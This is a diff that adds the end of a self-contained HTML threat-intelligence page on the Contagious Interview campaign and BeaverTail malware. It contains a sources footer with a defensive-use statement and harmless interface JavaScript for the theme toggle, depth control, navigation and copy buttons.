+    <div class="sec-head"><span class="sec-num">◇</span><h2>Sources &amp; handling</h2></div>
+    <div class="disc">
+      <h4>Self-contained by design</h4>
+      <p>This is a single-file atlas: no external fonts, scripts, or assets, and no runtime network calls. It renders identically saved to disk and opened offline. The sources below are <b>provenance</b>, the page's substance stands on its own without following any of them.</p>
+      <h4 style="margin-top:16px">Defensive-use statement</h4>
+      <p>Threat intelligence for detection, response, and developer awareness. It contacts no attacker infrastructure and provides no functional malware. IOCs are shown defanged in prose and appear un-defanged only in the detection-artifact section for tooling ingestion. Verify all indicators in your own environment before blocking; nation-state infrastructure rotates quickly. The Notes from the Trenches story behind this dossier is at good.arcs.care/blog/nftt/take-home-trap.</p>
+    </div>
+    <h4>Public reporting referenced (provenance)</h4>
+    <div class="srclist">
+      <a href="https://attack.mitre.org/groups/G1052/">MITRE ATT&amp;CK, Group G1052 (Contagious Interview)</a>
+      <a href="https://attack.mitre.org/software/S1246/">MITRE ATT&amp;CK, BeaverTail (S1246)</a>
+      <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/">Unit 42, Contagious Interview: New BeaverTail &amp; InvisibleFerret variants</a>
+      <a href="https://unit42.paloaltonetworks.com/fake-north-korean-it-worker-activity-cluster/">Unit 42, Fake DPRK IT-worker / BeaverTail cluster</a>
+      <a href="https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/">Microsoft Security, Contagious Interview via fake developer interviews</a>
+      <a href="https://securitylabs.datadoghq.com/articles/tenacious-pungsan-dprk-threat-actor-contagious-interview/">Datadog, Tenacious Pungsan / Contagious Interview</a>
+      <a href="https://www.silentpush.com/blog/contagious-interview-front-companies/">Silent Push, Contagious Interview front companies (OtterCookie)</a>
+      <a href="https://opensourcemalware.com/blog/contagious-interview-vscode">OpenSource Malware, Contagious Interview abuses VS Code Tasks</a>
+      <a href="https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/">SentinelOne Labs, Contagious Interview threat-actor operations</a>
+      <a href="https://www.theregister.com/2025/09/25/lazarus_group_shares_malware_with_it_scammers/">The Register, Lazarus RAT code resurfaces in DPRK IT-worker scams</a>
+      <a href="https://malpedia.caad.fkie.fraunhofer.de/actor/wagemole">Malpedia, WageMole (related DPRK IT-worker actor)</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+(function(){
+  // theme toggle (three-state aware; starts from OS, user overrides)
+  var btn=document.getElementById('themeBtn');
+  function cur(){var t=document.documentElement.getAttribute('data-theme');
+    if(t)return t; return matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}
+  btn.addEventListener('click',function(){
+    var next=cur()==='dark'?'light':'dark';
+    document.documentElement.setAttribute('data-theme',next);
+    try{localStorage.setItem('ci-theme',next);}catch(e){}
+  });
+  try{var s=localStorage.getItem('ci-theme'); if(s)document.documentElement.setAttribute('data-theme',s);}catch(e){}
+
+  // ziggurat altitude control
+  var root=document.documentElement, seg=document.getElementById('altSeg');
+  function setDepth(d){
+    d=String(d); if(!/^[0-2]$/.test(d))d='2';
+    root.setAttribute('data-depth',d);
+    seg.querySelectorAll('button').forEach(function(b){
+      b.setAttribute('aria-pressed', b.getAttribute('data-alt-set')===d?'true':'false');
+    });
+    try{localStorage.setItem('ci-depth',d);}catch(e){}
+  }
+  seg.addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b)return; setDepth(b.getAttribute('data-alt-set'));
+  });
+  var d2='2'; try{var sd=localStorage.getItem('ci-depth'); if(sd)d2=sd;}catch(e){}
+  setDepth(d2);
+
+  // mobile section-nav hamburger
+  var navT=document.getElementById('navToggle'), navL=document.getElementById('navList');
+  if(navT&&navL){
+    function closeNav(){navL.classList.remove('open'); navT.setAttribute('aria-expanded','false');}
+    navT.addEventListener('click',function(e){
+      e.stopPropagation();
+      var open=navL.classList.toggle('open');
+      navT.setAttribute('aria-expanded',open?'true':'false');
+    });
+    navL.addEventListener('click',function(e){ if(e.target.closest('a')) closeNav(); });
+    document.addEventListener('click',function(e){ if(!navL.contains(e.target)&&!navT.contains(e.target)) closeNav(); });
+    document.addEventListener('keydown',function(e){ if(e.key==='Escape') closeNav(); });
+  }
+
+  // copy buttons
+  document.querySelectorAll('.copy').forEach(function(b){
+    b.addEventListener('click',function(){
+      var pre=b.closest('.codeblock').querySelector('pre');
+      var txt=pre.innerText;
+      var done=function(){var o=b.textContent;b.textContent='COPIED';setTimeout(function(){b.textContent=o;},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done,done);}
+      else{try{var r=document.createRange();r.selectNode(pre);var sel=getSelection();sel.removeAllRanges();sel.addRange(r);document.execCommand('copy');sel.removeAllRanges();done();}catch(e){}}
+    });
+  });
+})();
+</script>
